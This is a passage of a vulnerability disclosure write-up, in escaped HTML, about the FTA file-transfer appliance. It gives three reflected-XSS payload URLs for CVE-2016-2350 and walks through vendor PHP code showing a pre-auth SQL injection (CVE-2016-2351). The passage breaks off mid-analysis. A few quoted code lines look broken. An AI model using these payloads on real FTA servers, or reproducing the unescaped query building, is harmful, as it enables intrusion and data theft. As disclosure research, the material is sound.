&lt;h3 id=&quot;vulnerability-analysis-and-exploitation&quot;&gt;Vulnerability Analysis and Exploitation&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;
?f2=’-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;
?documentname=”onerror=”prompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;
?msg=ssologout&lt;br /&gt;
&amp;amp;loginurl=”&amp;gt;&amp;lt;svg/onload=”prompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;After code reviewing, a pre-authentication SQL Injection vulnerability was found in FTA. This vulnerability grants malicious users access to sensitive data and personal information on the server through SQL Injection, and launch remote code execution (RCE) by further exploiting privilege-escalating vulnerabilities.&lt;br /&gt;
The key to this problem lies in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; function called by security_key2.api!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Among these parameters, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$password&lt;/code&gt; are controllable by the attackers. And although the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; handles the passwords, it does not involve in the triggering of the vulnerability.&lt;br /&gt;
One thing to pay special attention is that the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; will be treated as a global variable which represents the current Application ID in use, and will be applied in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; accordingly. The code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; includes the following lines:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt;, the name of the database to be opened is controllable by the user. If wrong value was given, the program will be interrupted. Therefore, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; must be forged correctly.&lt;/p&gt;

&lt;p&gt;The following lines are the most important function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.* FROM t_mail_server &apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_status&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;exec:mysql_query(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;) respond:&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id  != \&apos;999\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;!(t_mail_server.c_flag &amp;amp; &apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_manager = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_name LIKE \&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%%&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_user_id LIKE \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The parameters passed onto the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt;  will be assembled into SQL statements. Among all the functions joining the assembling, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; is the most crucial one.&lt;br /&gt;
